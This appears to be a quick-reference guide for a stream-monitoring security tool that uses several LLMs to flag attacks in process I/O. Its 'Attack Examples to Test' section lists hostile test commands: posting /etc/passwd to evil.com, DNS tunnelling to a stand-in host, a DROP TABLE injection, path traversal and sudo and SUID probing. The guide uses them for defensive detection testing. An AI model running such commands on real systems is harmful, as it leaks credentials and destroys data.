# Phase 1 Quick Reference

## Command Cheat Sheet

```bash
# Stream Management
strigoi> stream setup stdio /usr/bin/python3
strigoi> stream list
strigoi> stream start stdio-python3-1234567890
strigoi> stream stop stdio-python3-1234567890
strigoi> stream filter stdio-python3-1234567890 "password|secret"
strigoi> stream analyze stdio-python3-1234567890

# View Results
strigoi> show threats
strigoi> show stream stdio-python3-1234567890
strigoi> export evidence ./evidence/
```

## Key Components Map

```
internal/
├── stream/              # Core stream infrastructure
│   ├── types.go        # Interfaces and types
│   ├── manager.go      # Stream lifecycle management
│   ├── router.go       # Event routing
│   └── stdio/          # STDIO implementation
│       └── stream.go   # Process I/O capture
├── analysis/           # Multi-LLM analysis
│   ├── engine.go      # Analysis orchestration
│   ├── consensus.go   # Consensus building
│   ├── claude/        # Claude analyzer
│   └── gemini/        # Gemini A2A analyzer
├── patterns/          # Attack pattern library
│   ├── injection.go   # Injection patterns
│   ├── exfiltration.go # Data leak patterns
│   └── privilege.go   # Privilege escalation
└── core/              # CLI and framework
    └── console_stream.go # Stream commands
```

## Common Patterns

### Setting Up Monitoring
```go
// Monitor a Python script
stream setup stdio /usr/bin/python3 script.py

// Monitor a shell
stream setup stdio /bin/bash

// Monitor a specific process by name
stream setup stdio node server.js
```

### Filtering Noise
```go
// Ignore debug output
stream filter <id> exclude "DEBUG|TRACE"

// Focus on security keywords
stream filter <id> include "password|auth|sudo|exec"

// Rate limiting
stream filter <id> ratelimit 100/s
```

### Analysis Patterns
```go
// Real-time analysis (automatic)
stream analyze <id> auto

// Manual analysis trigger
stream analyze <id> now

// Historical analysis
stream analyze <id> --from="5m ago"
```

## Attack Examples to Test

### 1. Command Injection
```bash
# Via subprocess
python3 -c "import os; os.system('ls; cat /etc/passwd')"

# Via SQL
mysql -e "'; DROP TABLE users; --"

# Via path manipulation
cat "../../../etc/passwd"
```

### 2. Data Exfiltration
```bash
# Base64 encoding
cat sensitive.txt | base64

# DNS tunneling simulation
dig secret.data.evil.com

# Large data transfer
curl -X POST -d @/etc/passwd http://evil.com
```

### 3. Privilege Escalation
```bash
# Sudo attempts
sudo -l
echo "password" | sudo -S command

# SUID abuse
find / -perm -4000 2>/dev/null
```

## Performance Tuning

### Buffer Sizes
```go
// Small processes (low output)
BufferSize: 8 * 1024  // 8KB

// Normal processes
BufferSize: 64 * 1024  // 64KB (default)

// High-output processes
BufferSize: 256 * 1024  // 256KB
```

### LLM Optimization
```go
// Batch small events
BatchWindow: 100ms
BatchSize: 10

// Priority routing
HighPriority: []string{"sudo", "passwd", "exec"}
LowPriority: []string{"SELECT", "GET", "read"}
```

## Troubleshooting

### Stream Not Capturing
```bash
# Check process exists
ps aux | grep <process>

# Check permissions
ls -la /proc/<pid>/fd/

# Enable debug mode
stream debug <id> on
```

### High Latency
```bash
# Check LLM response times
show metrics llm

# Reduce analysis frequency
stream throttle <id> 10/s

# Use local patterns first
stream mode <id> hybrid
```

### False Positives
```bash
# Add to whitelist
patterns whitelist add "safe_pattern"

# Tune sensitivity
stream sensitivity <id> low|medium|high

# Review and learn
stream feedback <event-id> false-positive
```

## Architecture Decisions

### Why These Choices?

1. **Go Language**
   - Excellent concurrency for stream processing
   - Low overhead for system monitoring
   - Easy deployment (single binary)

2. **Multi-LLM Approach**
   - Claude: Deep pattern analysis
   - Gemini: Large context correlation
   - Consensus: Reduce false positives

3. **Stream Abstraction**
   - Future-proof for new stream types
   - Clean separation of concerns
   - Testable components

4. **Edge Filtering**
   - Reduce LLM costs
   - Lower latency
   - Privacy preservation

## Success Metrics

### Phase 1 Goals
- ✓ Detect 5 attack types in real-time
- ✓ <100ms detection latency
- ✓ <10% CPU overhead
- ✓ Zero false positives on normal dev work
- ✓ Clean architecture for expansion

### Key Performance Indicators
```bash
# View current metrics
show metrics

# Expected values:
Events/sec: 1000+
LLM latency: <100ms avg
Memory usage: <100MB
Active streams: 10+
Detection rate: >95%
```

## Next Phase Preview

### Phase 2: Remote STDIO
- Deploy agents to remote systems
- Secure A2A communication
- Cross-host correlation
- Distributed attack detection

### Getting Ready
1. Test Phase 1 thoroughly
2. Document lessons learned
3. Plan network architecture
4. Design agent security model

---

*"Simple to start, powerful to grow"*